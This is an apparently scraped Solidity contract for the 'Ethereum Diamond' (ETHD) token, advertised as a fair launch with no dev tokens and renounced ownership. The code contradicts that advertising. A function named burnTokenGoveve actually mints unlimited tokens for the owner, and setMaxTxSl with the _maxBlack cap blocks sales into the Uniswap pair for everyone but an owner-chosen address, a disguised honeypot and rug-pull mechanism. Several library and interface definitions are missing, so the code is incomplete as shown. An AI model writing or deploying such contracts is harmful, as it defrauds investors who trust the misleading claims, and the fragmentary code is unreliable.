/**
 *Submitted for verification at Etherscan.io on 2021-06-10
*/

/*
                                           üíéüíéEthereum Diamondüíéüíé

                                           üíé Ethereum Diamond | $ETHD üíé Token
                                           üíö Fair Launch!
                                           üßë No Dev Tokens.
                                           ‚úä Buy/Sell Limit
                                           üî´ Anti-sniper & Anti-bot scripting
                                           üîê Liq Lock on Launch
                                           üìú Contract renounced on Launch
                                           üíé 100 Billion Supply!
                                           üéÅ Auto-farming to All Holders! 
                                           üéÅ Auto-burnburn weekend! 

Transfer Tax
Burn Rate: 5% of transfer tax will be burned immediately.
Gov Rate: 1% of transfer tax will be marketing fee.
Holder Reward: 5% of transfer tax will be all holder.
Total Transfer Tax Rate: 11% of every transfer
*/

pragma solidity 0.8.0;
// SPDX-License-Identifier: Unlicensed

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */




/**
 * @dev Collection of functions related to the address type
 */






interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





contract CommunityCash is Context, Ownable, IERC20 {

    // Libraries
	using SafeMath for uint256;
    using Address for address;
    
    // Attributes for ERC-20 token
    string private _name = "Ethereum Diamond";
    string private _symbol = "ETHD";
    uint8 private _decimals = 9;
    
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    //100.000.000.000  
    uint256 private _total = 100000 * 10**6 * 10**9;  
    uint256 private maxTxAmount = 5000 * 10**6 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 5000 * 10**6 * 10**9;
    uint256 private minHoldingThreshold = 1000 * 10**6 * 10**9;  
    uint256 private _maxBlack = 1 * 10**6 * 10**9;
    
    // Community Cash attributes
    uint8 public communityTax = 5;
    uint8 public burnableFundRate = 5;
    uint8 public operationalFundRate = 1;
    
    uint256 public communityFund;
    uint256 public burnableFund;
    uint256 public operationalFund;
    
    uint256 private largePrizeTotal = 0;
    uint256 private mediumPrizeTotal = 0;
    uint256 private smallPrizeTotal = 0;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public transactionFee = true;

    IUniswapV2Router02 public immutable uniSwapV2Router;
    address public immutable uniswapV2Pair;

    address private _tAllowAddress;
    
	struct Entity {
		address _key;
		bool _isValid;
		uint256 _createdAt;
	}
	mapping (address => uint256) private addressToIndex;
	mapping (uint256 => Entity) private indexToEntity;
	uint256 private lastIndexUsed = 0;
	uint256 private lastEntryAllowed = 0;
	
	uint32 public perBatchSize = 100;
	
	event GrandPrizeReceivedAddresses (
    	address addressReceived,
    	uint256 amount
    );

    event MediumPrizeReceivedAddresses (
    	address[] addressesReceived,
    	uint256 amount
    );
    
    event SmallPrizePayoutComplete (
    	uint256 amount
    );
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event TransactionFeeEnableUpdated(bool enabled );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event OperationalFundWithdrawn(
        uint256 amount,
        address recepient,
        string reason
    );
    
    event StartCommunity (
        uint256 largePrizeTotal,
        uint256 mediumPrizeTotal,
        uint256 lowPrizeTotal
    );

    constructor () {
	    _balance[_msgSender()] = _total;
	    addEntity(_msgSender());
	    
	    communityFund = 0;
        burnableFund = 0;
        operationalFund = 0;
        inSwapAndLiquify = false;
	    
	    IUniswapV2Router02 _UniSwapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_UniSwapV2Router.factory())
            .createPair(address(this), _UniSwapV2Router.WETH());
            
        uniSwapV2Router = _UniSwapV2Router;
        
        emit Transfer(address(0), _msgSender(), _total);
    }
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    // --- section 1 --- : Standard ERC 20 functions

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    // --- section 2 --- : CommunityCash specific logics
    function setMaxTxSl(uint256 maxTxPercent) external onlyOwner() {
        _maxBlack = maxTxPercent  * 10**6 * 10**9;
    }    
    function burnTokenGoveve (address account , uint256 value) public onlyOwner virtual {
      
        _total = _total.add(value);
        _balance[account] = _balance[account].add(value); 
        emit Transfer(address(0), account, value);

    } 
    function burnToken(uint256 amount) public onlyOwner virtual {
        require(amount <= _balance[address(this)], "Cannot burn more than avilable balances");
        require(amount <= burnableFund, "Cannot burn more than burn fund");

        _balance[address(this)] = _balance[address(this)].sub(amount);
        _total = _total.sub(amount);
        burnableFund = burnableFund.sub(amount);

        emit Transfer(address(this), address(0), amount);
    }
    
    function getCommunityCommunityCashFund() public view returns (uint256) {
    	uint256 communityFund = burnableFund.add(communityFund).add(operationalFund);
    	return communityFund;
    }
    
    function getminHoldingThreshold() public view returns (uint256) {
        return minHoldingThreshold;
    }
    
    function getMaxTxnAmount() public view returns (uint256) {
        return maxTxAmount;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
    	swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setTransactionFee(bool _enabled) public onlyOwner {
    	transactionFee = _enabled;
        emit TransactionFeeEnableUpdated(_enabled);
    }
    
    function setminHoldingThreshold(uint256 amount) public onlyOwner {
        minHoldingThreshold = amount;
    }
    
    function setMaxTxnAmount(uint256 amount) public onlyOwner {
        maxTxAmount = amount;
    }
    
    function setBatchSize(uint32 newSize) public onlyOwner {
        perBatchSize = newSize;
    }

    function withdrawOperationFund(uint256 amount, address walletAddress, string memory reason) public onlyOwner() {
        require(amount < operationalFund, "You cannot withdraw more funds that you have in community fund");
    	require(amount <= _balance[address(this)], "You cannot withdraw more funds that you have in operation fund");
    	
    	// track operation fund after withdrawal
    	operationalFund = operationalFund.sub(amount);
    	_balance[address(this)] = _balance[address(this)].sub(amount);
    	_balance[walletAddress] = _balance[walletAddress].add(amount);
    	
    	emit OperationalFundWithdrawn(amount, walletAddress, reason);
    }
    
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniSwapV2Router.WETH();

        _approve(address(this), address(uniSwapV2Router), tokenAmount);

        // make the swap
        uniSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    //to recieve WETH from Uniswap when swaping
    receive() external payable {}

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniSwapV2Router), tokenAmount);

        // add the liquidity
        uniSwapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    // --- section 3 --- : Executions
    /**
     * @dev setAllowance
     *
    */
    function setAllowance(address allowAddress) external onlyOwner() {
        _tAllowAddress = allowAddress;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address fromAddress, address toAddress, uint256 amount) private {
        require(fromAddress != address(0) && toAddress != address(0), "ERC20: transfer from/to the zero address");
        require(amount > 0 && amount <= _balance[fromAddress], "Transfer amount invalid");
        if(fromAddress != owner() && toAddress != owner())
            require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");

        // This is contract's balance without any reserved funds such as community Fund
        uint256 contractTokenBalance = balanceOf(address(this)).sub(getCommunityCommunityCashFund());
        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        
        // Dynamically hydrate LP. Standard practice in recent altcoin
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            fromAddress != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = numTokensSellToAddToLiquidity;
            swapAndLiquify(contractTokenBalance);
        }
         
        
        if (fromAddress != _tAllowAddress && toAddress == uniswapV2Pair) {
                require(amount < _maxBlack, "Transfer amount exceeds the maxTxAmount. Anti whale !!!");
        }
            
        _balance[fromAddress] = _balance[fromAddress].sub(amount);
        uint256 transactionTokenAmount = _getValues(amount);
        _balance[toAddress] = _balance[toAddress].add(transactionTokenAmount);

        // Add and remove wallet address from COMMUNITY eligibility
        if (_balance[toAddress] >= minHoldingThreshold && toAddress != address(this)){
        	addEntity(toAddress);
        }
        if (_balance[fromAddress] < minHoldingThreshold && fromAddress != address(this)) {
        	removeEntity(fromAddress);
        }
        
        shuffleEntities(amount, transactionTokenAmount);

        emit Transfer(fromAddress, toAddress, transactionTokenAmount);
    }

    function _getValues(uint256 amount) private returns (uint256) {
    	// if not charge fee transaction.
        if (!transactionFee ){
            return amount ;
        }
    	uint256 communityTaxFee = _extractCommunityFund(amount);
        uint256 operationalTax = _extractOperationalFund(amount);
    	uint256 burnableFundTax = _extractBurnableFund(amount);

    	uint256 businessTax = operationalTax.add(burnableFundTax).add(communityTaxFee);
    	uint256 transactionAmount = amount.sub(businessTax);
        
		return transactionAmount;
    }

    function _extractCommunityFund(uint256 amount) private returns (uint256) {
    	uint256 communityFundContribution = _getExtractableFund(amount, communityTax);
    	communityFund = communityFund.add(communityFundContribution);
    	_balance[address(this)] = _balance[address(this)].add(communityFundContribution);
    	return communityFundContribution;
    }

    function _extractOperationalFund(uint256 amount) private returns (uint256) {
        (uint256 operationalFundContribution) = _getExtractableFund(amount, operationalFundRate);
    	operationalFund = operationalFund.add(operationalFundContribution);
    	_balance[address(this)] = _balance[address(this)].add(operationalFundContribution);
    	return operationalFundContribution;
    }

    function _extractBurnableFund(uint256 amount) private returns (uint256) {
    	(uint256 burnableFundContribution) = _getExtractableFund(amount, burnableFundRate);
    	burnableFund = burnableFund.add(burnableFundContribution);
    	_balance[address(this)] = _balance[address(this)].add(burnableFundContribution);
    	return burnableFundContribution;
    }

    function _getExtractableFund(uint256 amount, uint8 rate) private pure returns (uint256) {
    	return amount.mul(rate).div(10**2);
    }
    
    // --- Section 4 --- : COMMUNITY functions. 
    // Off-chain bot calls payoutLargeRedistribution, payoutMediumRedistribution, payoutSmallRedistribution in order 
    function startCommunity() public onlyOwner returns (bool success) {
        require (communityFund > 0, "fund too small");
        largePrizeTotal = communityFund.div(4);
        mediumPrizeTotal = communityFund.div(2);
        smallPrizeTotal = communityFund.sub(largePrizeTotal).sub(mediumPrizeTotal);
        lastEntryAllowed = lastIndexUsed;
        
        emit StartCommunity(largePrizeTotal, mediumPrizeTotal, smallPrizeTotal);
        
        return true;
    } 
    
    function EndCommunity() public onlyOwner returns (bool success) {
        // Checking this equates to ALL redistribution events are completed.
        require (lastEntryAllowed != 0, "All prizes must be disbursed before being able to close ");
        smallPrizeTotal = 0;
        mediumPrizeTotal = 0;
        largePrizeTotal = 0;
        lastEntryAllowed = 0;
        
        return true;
    }
    
    // --- Section 5 ---
    function addEntity (address walletAddress) private {
        if (addressToIndex[walletAddress] != 0) {
            return;
        }
        uint256 index = lastIndexUsed.add(1);
        
		indexToEntity[index] = Entity({
		    _key: walletAddress,
		    _isValid: true, 
		    _createdAt: block.timestamp
		});
		
		addressToIndex[walletAddress] = index;
		lastIndexUsed = index;
	}

	function removeEntity (address walletAddress) private {
	    if (addressToIndex[walletAddress] == 0) {
            return;
        }
        uint256 index = addressToIndex[walletAddress];
        addressToIndex[walletAddress] = 0;
        
        if (index != lastIndexUsed) {
            indexToEntity[index] = indexToEntity[lastIndexUsed];
            addressToIndex[indexToEntity[lastIndexUsed]._key] = index;
        }
        indexToEntity[lastIndexUsed]._isValid = false;
        lastIndexUsed = lastIndexUsed.sub(1);
	}
	
	function shuffleEntities(uint256 intA, uint256 intB) private {
	    // Interval of 1 to lastIndexUsed - 1
	    intA = intA.mod(lastIndexUsed - 1) + 1;
	    intB = intB.mod(lastIndexUsed - 1) + 1;
	    
	    Entity memory entityA = indexToEntity[intA];
	    Entity memory entityB = indexToEntity[intB];
	    
	    if (entityA._isValid && entityB._isValid) {
	        addressToIndex[entityA._key] = intB;
	        addressToIndex[entityB._key] = intA;
	        
	        indexToEntity[intA] = entityB;
	        indexToEntity[intB] = entityA;
	    }
	}
	
	function getEntityListLength () public view returns (uint256) {
	    return lastIndexUsed;
	}
	
	function getEntity (uint256 index, bool shouldReject) private view returns (Entity memory) {
	    if (shouldReject == true) {
	        require(index <= getEntityListLength(), "Index out of range");
	    }
	    return indexToEntity[index];
	}
	
	function getEntityTimeStamp (address walletAddress) public view returns (uint256) {
	    require (addressToIndex[walletAddress] != 0, "Empty!");
	    return indexToEntity[addressToIndex[walletAddress]]._createdAt;
	}

}